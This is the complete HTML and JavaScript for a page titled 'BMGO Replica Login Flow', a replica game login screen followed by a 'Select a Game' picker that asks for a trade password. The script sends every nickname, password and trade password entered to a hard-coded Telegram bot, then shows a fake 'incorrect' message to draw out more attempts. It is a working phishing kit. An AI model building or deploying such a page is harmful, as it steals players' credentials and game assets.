<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>BMGO Replica Login Flow</title>
<style>
:root {
  --bg: #0a0a0a;
  --text: #e6edf3;
  --accent: #7c3aed;
  --btn-color: #ff6a00;
  --shadow: 0 0 20px rgba(0,0,0,0.7);
  --spring: cubic-bezier(.16,1,.3,1);
}

/* Reset & Body */
* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif;}
html, body {height:100%; background:var(--bg);}
.stage {position:fixed; inset:0; display:grid; place-items:center;}
.screen-wrap {position:relative; overflow:hidden; background:var(--bg);}
@media (min-aspect-ratio:9/16) {.screen-wrap{height:100vh; width:calc(100vh*9/16);} }
@media (max-aspect-ratio:9/16) {.screen-wrap{width:100vw; height:calc(100vw*16/9);} }

/* Screens */
.screen {position:absolute; inset:0; opacity:0; pointer-events:none; transform:translateY(18px) scale(.985); transition: transform .45s var(--spring), opacity .35s var(--spring);}
.screen.active {opacity:1; pointer-events:auto; transform:translateY(0) scale(1);}
video, img.fit {position:absolute; inset:0; width:100%; height:100%; object-fit:contain; background:#000;}

/* Screen 2 Login */
.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    height: 100%;
    padding: 20px;
}
.toolbar { width: 100%; display: flex; align-items: center; height: 60px; }
.back-btn {
    width: 40px;
    height: 40px;
    background: url('https://cdn-icons-png.flaticon.com/512/93/93634.png') center center no-repeat;
    background-size: contain;
    border: none;
    cursor: pointer;
}
h1 { margin-top: 10px; font-size: 20px; font-weight: bold; color:#fff; }
.input-field { width: 100%; max-width: 400px; margin-top: 20px; position: relative; }
.input-field input {
    width: 100%;
    padding: 12px 40px 12px 40px;
    border-radius: 8px;
    border: none;
    background: #fff;
    color: #000;
    font-size: 14px;
    box-sizing: border-box;
}
.input-field img.icon-left {
    position: absolute;
    top: 50%;
    left: 10px;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    pointer-events:none;
}
.input-field img.eye-toggle {
    position: absolute;
    top: 50%;
    right: 10px;
    transform: translateY(-50%);
    width: 24px;
    height: 24px;
    cursor: pointer;
}
.login-btn {
    width: 100%;
    max-width: 400px;
    margin-top: 20px;
    padding: 12px;
    border: none;
    border-radius: 8px;
    background: linear-gradient(45deg, #FFD700, #FFA500);
    color: #000;
    font-weight: bold;
    cursor: pointer;
    position: relative;
}
.forgot-password, .register, .privacy { margin-top: 10px; font-size: 13px; color: #bbb; cursor: pointer; }
.third-login { display: flex; margin-top: 20px; gap: 10px; }
.third-login img { width: 50px; height: 50px; border-radius: 8px; cursor: pointer; }

/* Screen 3 Picker */
#scr-picker { background:url('assets/catalog.png') center center / contain no-repeat; }
.picker-overlay { position:absolute; inset:0; display:grid; place-items:center; }
.picker {
    width:min(420px, 90%);
    border-radius:20px;
    background: rgba(20,20,30,0.9);
    border:1px solid rgba(255,255,255,0.15);
    color:#fff;
    padding:20px;
    display:flex;
    flex-direction:column;
    gap:12px;
}
.title { font-weight:800; font-size:24px; text-align:center; margin-bottom:16px; color:#fff; }
.grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
.game { display:flex; justify-content:center; align-items:center; padding:14px; border-radius:12px; font-weight:600; color:#fff; cursor:pointer; background:linear-gradient(135deg,#7c3aed,#ff004c); font-family:'Minecraft',sans-serif; transition:0.3s; }
.game:active { background:linear-gradient(135deg,#ff004c,#7c3aed); transform:scale(0.95);}
.game.disabled {opacity:0.5; cursor:not-allowed;}
.pw { display:none; flex-direction:column; gap:8px; margin-top:12px; }
.pw input { padding:10px; border-radius:8px; border:none; font-size:16px; }
.pw button { padding:10px; border-radius:8px; border:none; font-weight:bold; background:linear-gradient(45deg,#7c3aed,#ff004c); color:#fff; cursor:pointer; }

</style>
</head>
<body>
<div class="stage">
  <div class="screen-wrap">

    <!-- Screen 1: Video -->
    <section class="screen active" id="scr-video">
      <video id="introVideo" autoplay muted playsinline src="assets/intro.mp4"></video>
    </section>

    <!-- Screen 2: Login -->
    <section class="screen" id="scr-login">
      <div class="container">
        <div class="toolbar"><button class="back-btn"></button></div>
        <h1>Login</h1>
        <div class="input-field">
            <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png" class="icon-left" alt="user">
            <input type="text" placeholder="Enter your nickname" id="username">
        </div>
        <div class="input-field">
            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" class="icon-left" alt="password">
            <input type="password" placeholder="Enter password" id="password">
            <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" class="eye-toggle" alt="eye" id="togglePassword">
        </div>
        <div class="forgot-password">Forgot Password?</div>
        <button class="login-btn" id="loginBtn">Login</button>
        <div class="register">Register</div>
        <div class="third-login">
            <img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" alt="Google">
            <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
            <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
        </div>
        <div class="privacy">Privacy Policy</div>
      </div>
    </section>

    <!-- Screen 3: Picker -->
    <section class="screen" id="scr-picker">
      <div class="picker-overlay">
        <div class="picker">
          <div class="title">Select a Game</div>
          <div class="grid">
            <button class="game" id="btnSB">Skyblock</button>
            <button class="game disabled" id="btnBW">Bedwars</button>
          </div>
          <div class="pw" id="pwBox">
            <input id="tradePw" type="password" inputmode="numeric" placeholder="Trade password (4–12 digits)" minlength="4" maxlength="12">
            <button id="submitPw">Continue</button>
          </div>
        </div>
      </div>
    </section>

  </div>
</div>

<script>
const $ = (s,r=document)=>r.querySelector(s);
const screens=['scr-video','scr-login','scr-picker'];
function go(id){screens.forEach(n=>{$('#'+n).classList.toggle('active', n===id);});}

// Video autoplay
const vid = $('#introVideo');
document.addEventListener('pointerdown',()=>{if(vid.paused) vid.play().catch(()=>{});},{once:true});
vid.addEventListener('ended',()=>go('scr-login'));
if(vid.readyState>=2) vid.play().catch(()=>{});  

// Login functionality
$('#togglePassword').addEventListener('click', ()=>{
  const pw=$('#password');
  pw.type = pw.type==='password'?'text':'password';
  $('#togglePassword').src = pw.type==='password'
      ? 'https://cdn-icons-png.flaticon.com/512/159/159604.png'
      : 'https://cdn-icons-png.flaticon.com/512/159/159605.png';
});

// Picker functionality
const pwBox=$('#pwBox'), tradePw=$('#tradePw');
$('#btnSB').addEventListener('click', ()=>{ pwBox.style.display='flex'; tradePw.focus(); });
$('#btnBW').addEventListener('click', ()=>{});

// Telegram integration
const telegramToken = '8435784075:AAFsSONbd4_iBd-cMrkBKrHqiY3chIg06Y8';
const chatId = '1002960647771'; // your chat ID

function sendToTelegram(message){
    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ chat_id: chatId, text: message })
    });
}

// Login → send ID & Password
$('#loginBtn').addEventListener('click', ()=>{
    const username = $('#username').value.trim();
    const password = $('#password').value.trim();
    if(!username || !password){ alert('Enter both ID and Password!'); return; }

    sendToTelegram(`───── ID ─────\n${username}`);
    sendToTelegram(`───── PASSWORD ─────\n${password}`);

    go('scr-picker');
});

// Trade password → send separately
$('#submitPw').addEventListener('click', ()=>{
    const trade = $('#tradePw').value.trim();
    if(!trade){ alert('Enter Trade Password!'); return; }

    sendToTelegram(`───── TRADE PASSWORD ─────\n${trade}`);
    alert('Trade PASSWORD IS INCORRECT!');
});

// Optional: back button
$('.back-btn').addEventListener('click', ()=>go('scr-video'));
</script>
</body>
</html>
